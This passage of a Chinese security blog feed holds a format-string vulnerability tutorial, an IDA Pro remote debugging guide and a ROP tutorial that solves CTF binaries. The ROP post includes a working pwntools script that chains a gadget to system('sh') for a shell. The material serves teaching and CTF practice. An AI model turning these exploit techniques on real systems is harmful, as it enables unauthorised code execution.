class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,buf);<br>    <span class="hljs-built_in">printf</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>程序仍然会正常运行，但是却留下了十分严重的漏洞，我们下来看一下<code>printf()</code>的原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span> <span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> * format, ... )</span>;<br></code></pre></td></tr></table></figure><p>我们可以通过一个程序来看一下此函数再处理参数时都干了些什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d%d%d%d%s&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x16</span>,<span class="hljs-string">&quot;Hvnt3r&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用gcc编译之后用gdb查看main()的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">gdb-peda$ disass main<br>Dump of assembler code for function main:<br>   0x0000000000001135 &lt;+0&gt;:push   rbp<br>   0x0000000000001136 &lt;+1&gt;:mov    rbp,rsp<br>   0x0000000000001139 &lt;+4&gt;:lea    r9,[rip+0xec4]        # 0x2004<br>   0x0000000000001140 &lt;+11&gt;:mov    r8d,0x16<br>   0x0000000000001146 &lt;+17&gt;:mov    ecx,0x2<br>   0x000000000000114b &lt;+22&gt;:mov    edx,0x1<br>   0x0000000000001150 &lt;+27&gt;:mov    esi,0x0<br>   0x0000000000001155 &lt;+32&gt;:lea    rdi,[rip+0xeaf]        # 0x200b<br>   0x000000000000115c &lt;+39&gt;:mov    eax,0x0<br>   0x0000000000001161 &lt;+44&gt;:call   0x1030 &lt;printf@plt&gt;<br>   0x0000000000001166 &lt;+49&gt;:mov    eax,0x0<br>   0x000000000000116b &lt;+54&gt;:pop    rbp<br>   0x000000000000116c &lt;+55&gt;:ret    <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>将断点下在<code>call 0x1030</code>上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]<br>RAX: 0x0 <br>RBX: 0x0 <br>RCX: 0x2 <br>RDX: 0x1 <br>RSI: 0x0 <br>RDI: 0x55555555600b (<span class="hljs-string">&quot;%d%d%d%d%s&quot;</span>)<br>RBP: 0x7fffffffe020 --&gt; 0x555555555170 (&lt;__libc_csu_init&gt;:push   r15)<br>RSP: 0x7fffffffe020 --&gt; 0x555555555170 (&lt;__libc_csu_init&gt;:push   r15)<br>RIP: 0x555555555161 (&lt;main+44&gt;:call   0x555555555030 &lt;<span class="hljs-built_in">printf</span>@plt&gt;)<br>R8 : 0x16 <br>R9 : 0x555555556004 --&gt; 0x25007233746e7648 (<span class="hljs-string">&#x27;Hvnt3r&#x27;</span>)<br>R10: 0x0 <br>R11: 0x1 <br>R12: 0x555555555050 (&lt;_start&gt;:xor    ebp,ebp)<br>R13: 0x7fffffffe100 --&gt; 0x1 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x555555555150 &lt;main+27&gt;:mov    esi,0x0<br>   0x555555555155 &lt;main+32&gt;:lea    rdi,[rip+0xeaf]        <span class="hljs-comment"># 0x55555555600b</span><br>   0x55555555515c &lt;main+39&gt;:mov    eax,0x0<br>=&gt; 0x555555555161 &lt;main+44&gt;:call   0x555555555030 &lt;<span class="hljs-built_in">printf</span>@plt&gt;<br>   0x555555555166 &lt;main+49&gt;:mov    eax,0x0<br>   0x55555555516b &lt;main+54&gt;:pop    rbp<br>   0x55555555516c &lt;main+55&gt;:ret    <br>   0x55555555516d:nop    DWORD PTR [rax]<br>Guessed arguments:<br>arg[0]: 0x55555555600b (<span class="hljs-string">&quot;%d%d%d%d%s&quot;</span>)<br>arg[1]: 0x0 <br>arg[2]: 0x1 <br>arg[3]: 0x2 <br>arg[4]: 0x16 <br>arg[5]: 0x555555556004 --&gt; 0x25007233746e7648 (<span class="hljs-string">&#x27;Hvnt3r&#x27;</span>)<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffe020 --&gt; 0x555555555170 (&lt;__libc_csu_init&gt;:push   r15)<br>0008| 0x7fffffffe028 --&gt; 0x7ffff7e0fb17 (&lt;__libc_start_main+231&gt;:mov    edi,eax)<br>0016| 0x7fffffffe030 --&gt; 0x0 <br>0024| 0x7fffffffe038 --&gt; 0x7fffffffe108 --&gt; 0x7fffffffe421 (<span class="hljs-string">&quot;/root/0101/0x06/format_x86/a.out&quot;</span>)<br>0032| 0x7fffffffe040 --&gt; 0x100040000 <br>0040| 0x7fffffffe048 --&gt; 0x555555555135 (&lt;main&gt;:push   rbp)<br>0048| 0x7fffffffe050 --&gt; 0x0 <br>0056| 0x7fffffffe058 --&gt; 0x7ed789accfb6e8e0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, 0x0000555555555161 <span class="hljs-keyword">in</span> main ()<br>gdb-peda$ <br></code></pre></td></tr></table></figure><p>在这里可以看到参数的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Guessed arguments:<br>arg[0]: 0x55555555600b (<span class="hljs-string">&quot;%d%d%d%d%s&quot;</span>)<br>arg[1]: 0x0 <br>arg[2]: 0x1 <br>arg[3]: 0x2 <br>arg[4]: 0x16 <br>arg[5]: 0x555555556004 --&gt; 0x25007233746e7648 (<span class="hljs-string">&#x27;Hvnt3r&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>printf()</code>是C语言中少见的可以支持可变参数的库函数，当参数可变时，就没有严格的格式限制了，因此函数的调用者可以自由地向函数传递参数，但是作为被调用者的<code>printf()</code>，它并不知道在调用它之前有多少参数被压入了栈帧当中，也不知道这些参数的类型是什么，只会根据调用者输入的信息按部就班的执行，因此当我们输入一些非预期的参数时，就会产生漏洞。</p><h2 id="通过格式化字符串漏洞泄露内存数据"><a href="#通过格式化字符串漏洞泄露内存数据" class="headerlink" title="通过格式化字符串漏洞泄露内存数据"></a>通过格式化字符串漏洞泄露内存数据</h2><p>举个例子，当我们要<code>printf()</code>打印出的变量的数量大于我们所给的变量的个数时，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此代码运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali  ./a.out <br>f58be668,f58be678,ac13f718,ac140d80,ac140d80,02a43160,abfaab17,00000000,f58be668,00040000,02a43135,00000000<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>此程序打印出的这些字符串实际上是栈上的数据，这样就造成了一个内存的<code>leak</code>，另外，我们可以构造不同的参数来泄露指定位置的数据，如使用两个<code>%f</code>可以找到目标之前16个字节的位置，使用<code>%3$s</code>指的是第4个参数等，但是缓冲区溢出漏洞的危害不知是可以泄露内存上的数据，我们还可以利用此漏洞来修改栈上的数据</p><h2 id="利用格式化字符串漏洞修改栈上的数据"><a href="#利用格式化字符串漏洞修改栈上的数据" class="headerlink" title="利用格式化字符串漏洞修改栈上的数据"></a>利用格式化字符串漏洞修改栈上的数据</h2><p>要想利用<code>printf()</code>对栈上的数据进行修改，我们需要用到一个很少见的参数：<code>%n</code>，<code>%n</code> 用于将当前字符串的长度打印到<code>var</code>中，例 <code>printf(&quot;test %hn&quot;,&amp;var)</code>其中<code>var</code>为两个字节，<code>printf(&quot;test %n&quot;,&amp;var)</code>其中<code>var</code>为一个字节。</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hvnt3r%n&quot;</span>,&amp;a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali  ./a.out <br>Hvnt3r   <br>6<br></code></pre></td></tr></table></figure><p>此时我们恶意发现我们通过<code>printf()</code>函数＋<code>%n</code>参数将<code>a</code>的值从<code>0</code>改为了<code>6</code>，因为<code>Hvnt3r</code>有6个字节，发现了这一特性配合上面的内存信息泄露，我们可以精心的改造有漏洞的<code>printf()</code>函数来达到修改程序逻辑的目的，话不多说，我们找几个例子来看一下。</p><h2 id="32位系统环境下的漏洞利用"><a href="#32位系统环境下的漏洞利用" class="headerlink" title="32位系统环境下的漏洞利用"></a>32位系统环境下的漏洞利用</h2><h2 id="64位系统环境下的漏洞利用"><a href="#64位系统环境下的漏洞利用" class="headerlink" title="64位系统环境下的漏洞利用"></a>64位系统环境下的漏洞利用</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>二进制安全</tag>
      
      <tag>格式化字符串漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA Pro远程调试</title>
    <link href="/2018/10/IDA-Pro%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <url>/2018/10/IDA-Pro%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>有的时候感觉<code>gdb</code>的命令行界面在显示一些数据时比较繁琐，因此试了一下<code>IDA</code>远程调试，感觉数据的查看会方便很多，可能还是我太菜了，之后成大佬了再只用<code>gdb</code>吧。</p><p>其实IDA也有Linux版的，在我之前装<code>kali</code>双系统的时候用过，体验尚可，但是运行过程中常常有一些奇怪的报错，函数名称的识别也不够准确，因此在这里记录一下再<code>WIN</code>下使用<code>IDA pro</code>调试<code>Linux</code>程序的过程。</p><h3 id="0x00-寻找安装路径"><a href="#0x00-寻找安装路径" class="headerlink" title="0x00 寻找安装路径"></a>0x00 寻找安装路径</h3><p>先找到物理机上IDA的安装位置，找到如下文件夹</p><p><img src="https://i.loli.net/2018/10/24/5bd02b0e8091d.png"></p><span id="more"></span><p>打开后复制以下两个文件到Linux中</p><p><img src="https://i.loli.net/2018/10/24/5bd04e3430c97.png"></p><h3 id="0x01-附加到进程的远程调试"><a href="#0x01-附加到进程的远程调试" class="headerlink" title="0x01 附加到进程的远程调试"></a>0x01 附加到进程的远程调试</h3><p>以上两个文件中，<code>linux_server</code>用来调试32位程序的，<code>linux_server64</code>是用来调试64位程序的，两者互不相兼容。</p><p>使用<code>chmod +x linux_server64</code>位程序添加执行权限并运行该程序，打开IDA选中如下菜单</p><p><img src="https://i.loli.net/2018/10/24/5bd02ec541f07.png"></p><p>填入Linux的IP，密码为空</p><p><img src="https://i.loli.net/2018/10/24/5bd02f1885278.png"></p><p>点击OK后会弹出一个Linux主机上运行的进程的窗口，选择要调试的程序即可进行调试</p><h3 id="0x02-直接调试"><a href="#0x02-直接调试" class="headerlink" title="0x02 直接调试"></a>0x02 直接调试</h3><p>按照图片所示内容进行选择</p><p><img src="https://i.loli.net/2018/10/24/5bd03067cb0e5.png"></p><p><img src="C:\Users\26032\AppData\Local\Temp\1540370597301.png" alt="1540370597301"></p><p>输入要调试的文件的路径，名称，Linux的IP地址，点击OK</p><p><img src="https://i.loli.net/2018/10/24/5bd032883e425.png"></p><p><img src="https://i.loli.net/2018/10/24/5bd032c9b02d3.png"></p><p>成功！</p>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>调试</tag>
      
      <tag>IDA</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二进制安全之NX绕过方法--ROP</title>
    <link href="/2018/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8BROP/"/>
    <url>/2018/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8BROP/</url>
    
    <content type="html"><![CDATA[<p>在之前的缓冲区溢出的实验中，溢出到栈中的<code>shellcode</code>可以直接被系统执行，给系统安全带来了极大的风险，因此<code>NX</code>技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意<code>shellcode</code>写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名为ROP（Return-Oriented Programming）的技术就能绕过这项安全措施，ROP的核心思想是利用<code>ret</code>，<code>jmp</code>，<code>call</code>等指令（主要是<code>ret</code>）来连接代码的上下文从而改变程序执行流程的一项技术，由于ret指令的功能是将当前的栈顶数据弹出到<code>EIP</code>中并跳转执行，我们可以在栈中精心构造一些以<code>ret</code>结尾的特殊指令（gadget）使系统跳转到我们在栈中放置的指令的位置，进而执行这些指令，达到攻击的效果。</p><span id="more"></span><h2 id="64位ELF的ROP"><a href="#64位ELF的ROP" class="headerlink" title="64位ELF的ROP"></a>64位ELF的ROP</h2><p>先拿一道<code>bugs bunny ctf 2017</code>的<code>pwn150</code>来说：</p><p><a href="https://pan.baidu.com/s/1vWo03QA2ueqN9-uzgpJaXQ">题目下载</a></p><p>这是一个64位的ELF文件且程序开启了NX：</p><p><img src="https://i.loli.net/2018/10/24/5bd04ad656935.png"></p><p>放到IDA里可以很容易发现<code>Hello()</code>函数中存在溢出漏洞：</p><p><img src="https://i.loli.net/2018/10/24/5bd04ba0a065f.png"></p><p>现看一下溢出的情况，可以使用IDA的远程调试来看看再发生溢出后寄存器的数据，<a href="https://hvnt3r.top/2018/10/IDA-Pro%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/">IDA远程调试教程</a></p><p>点击运行程序，向程序中输入如下字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ pattern_creat 150<br><span class="hljs-string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/25/5bd12fec4d9a7.png"></p><p>回车之后IDA报错，段错误，查看此时寄存器中的数值：</p><p><img src="https://i.loli.net/2018/10/24/5bd04fd9d3ed6.png"></p><p>栈内数据如下：</p><p><img src="https://i.loli.net/2018/10/24/5bd053257fdc5.png"></p><p>此时RSP寄存器中的值为<code>41416741414B4141</code>，ASCII转化一下就是<code>AAgAAKAA</code>，按照存储方式倒序就是<code>AAKAAgAA</code>，查看偏移量为88：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ pattern_offset AAKAAgAA<br>AAKAAgAA found at offset: 88<br></code></pre></td></tr></table></figure><p>至此我们找到了到达RSP的距离，如果想实现<code>system(&quot;/bin/sh&quot;)</code>起shell还需要找到<code>system()</code>函数的位置和字符串<code>/bin/sh</code>，和一个<code>gadget</code>，<code>gadget</code>是指程序中我们可以利用的代码片段，由于本程序为64位程序，在运行时与32位程序不同，64位程序的前六个整型或指针参数依次保存在<code>RDI</code>，<code>RSI</code>， <code>RDX</code>，<code>RCX</code>，<code>R8</code>和<code>R9</code>这六个寄存器中，多出来的参数才会入栈，因此我们按照<code>ROP</code>的思路，需要找到的<code>gadget</code>为<code>pop rdi , ret</code></p><p><code>system()</code>的位置可以在<code>main</code>函数中的一个<code>today()</code>中找到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000400756</span> ; __unwind &#123;<br>.text:<span class="hljs-number">0000000000400756</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000400757</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">000000000040075</span>A                 mov     edi, offset command ; <span class="hljs-string">&quot;/bin/date&quot;</span><br>.text:<span class="hljs-number">000000000040075F</span>                 call    _system<br>.text:<span class="hljs-number">0000000000400764</span>                 nop<br>.text:<span class="hljs-number">0000000000400765</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000400766</span>                 retn<br>.text:<span class="hljs-number">0000000000400766</span> ; &#125; <span class="hljs-comment">// starts at 400756</span><br>.text:<span class="hljs-number">0000000000400766</span> today           endp<br>.text:<span class="hljs-number">0000000000400766</span><br></code></pre></td></tr></table></figure><p>地址为<code>000000000040075F</code></p><p><code>/bin/sh</code>可以在Hello的输出语句的<code>shorry</code>中找到一个<code>sh</code></p><p><img src="https://i.loli.net/2018/10/24/5bd0656667462.png"></p><p>地址为<code>00000000004008fb</code></p><p>本来还想着这里怎么打错了，原来是留了后门啊，也可以在函数名中找到：</p><p><img src="https://i.loli.net/2018/10/24/5bd065cbcf9e8.png"></p><p>地址为<code>00000000004003ef</code></p><p>寻找目标<code>gadget</code>可用此程序：<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali ROPgadget --binary pwn150 | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br>0x0000000000400883 : pop rdi ; ret<br></code></pre></td></tr></table></figure><p>找到了以上的地址，可以构造脚本了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pytohon">#!/usr/bin/python<br>#coding:utf-8<br>from pwn import *<br>context.log_level = &#x27;debug&#x27;<br>context.update(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, timeout = 1)<br><br>io = process(&quot;./pwn150&quot;)<br><br>system = 0x40075f<br>binsh = 0x4003ef<br>pop_rdi_ret = 0x400883  <br><br>payload=&quot;A&quot;*88<br>payload+=p64(pop_rdi_ret)<br>payload+=p64(binsh)<br>payload+=p64(system)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/24/5bd0681883c81.png"></p><p>漏洞利用成功，再解释一下为什么 要这样构造脚本：</p><p>首先发送了88个字节填充无用空间，在88个字节之后的数据<code>gadget</code>会存储在ESP所指的内存区域，此时系统会执行<code>gadget</code>的指令<code>pop rdi ; ret</code>，<code>rsp+8</code>，通过<code>pop rdi</code>将<code>/bin/sh</code>弹出到RDI寄存器中，<code>rsp+8</code>，<code>rsp</code>此时指向<code>system()</code>，之后会执行<code>ret</code>，因为此时RSP指向<code>system()</code>，系统会调用<code>system()</code>函数并将<code>rdi</code>中的值作为参数传到<code>system()</code>中从而执行<code>system(&quot;/bin/sh&quot;)</code></p><h2 id="无system函数时调用int-0x80完成ROP"><a href="#无system函数时调用int-0x80完成ROP" class="headerlink" title="无system函数时调用int 0x80完成ROP"></a>无system函数时调用<code>int 0x80</code>完成ROP</h2><p>上文中的例子是程序中有system函数调用的情况，但是如果程序中没有system函数的调用应该怎么办呢？</p><p>我们可以使用<code>int 0x80</code>来进行系统中断</p><blockquote><p>启动系统调用需要使用<code>INT</code>指令。<code>linux</code>系统调用位于中断<code>0x80</code>，执行<code>INT</code>指令时，所有操作转移到内核中的系统调用处理程序，完成后执行转移到<code>INT</code>指令之后的下一条指令。操作系统实现系统调用的基本过程是：</p><ul><li>应用程序调用库函数（API）；</li><li>API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；</li><li>中断处理函数返回到API中；</li><li>API将EAX返回给应用程序。</li><li>寄存器<code>eax</code>存放调用号，剩下的几个寄存器存放参数。</li></ul></blockquote><p>拿<code>Tamu CTF 2018</code>的<code>pwn5</code>来说：</p><p><a href="https://pan.baidu.com/s/1EoQurswVJNR4siSFvC_KBg">题目下载</a></p><p>看一下开启的安全措施:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br></code></pre></td></tr></table></figure><p>IDA看一下:</p><p><img src="https://i.loli.net/2018/10/25/5bd19be503ced.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">first_day_corps</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;You wake with a start as your sophomore yells \&quot;Wake up fish %s! Why aren&#x27;t you with your buddies in the fallout hole?\&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;As your sophomore slams your door close you quickly get dressed in pt gear and go to the fallout hole.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You spend your morning excersizing and eating chow.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Finally your first day of class begins at Texas A&amp;M. What do you decide to do next?(Input option number)&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Go to class.\n2. Change your major.\n3. Skip class and sleep\n4. Study&quot;</span>);<br>  getchar();<br>  result = (<span class="hljs-type">char</span>)getchar();<br>  <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">50</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You decide that you are already tired of studying %s and go to the advisors office to change your major\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you change your major to?: &quot;</span>);<br>    result = change_major();<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( result &gt; <span class="hljs-number">50</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">51</span> )<br>    &#123;<br>      result = <span class="hljs-built_in">puts</span>(<br>                 <span class="hljs-string">&quot;You succumb to the sweet calling of your rack and decide that sleeping is more important than class at the moment.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">52</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<br>        <span class="hljs-string">&quot;You realize that the corps dorms are probably not the best place to be studying and decide to go to the library&quot;</span>);<br>      result = <span class="hljs-built_in">printf</span>(<br>                 <span class="hljs-string">&quot;Unfortunately the queitness of the library works against you and as you are studying %s related topics &quot;</span><br>                 <span class="hljs-string">&quot;you start to doze off and fall asleep\n&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">49</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You go to class and sit front and center as the Corps academic advisors told you to do.&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<br>      <span class="hljs-string">&quot;As the lecturer drones on about a topic that you don&#x27;t quite understand in the field of %s you feel yourself begin&quot;</span><br>      <span class="hljs-string">&quot;ning to drift off.\n&quot;</span>);<br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You wake with a start and find that you are alone in the lecture hall.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题的英文部分是真的多，分析一圈下来发现这些都是些没有什么作用的输出语句，漏洞存在于<code>change_major()</code>函数：<br><img 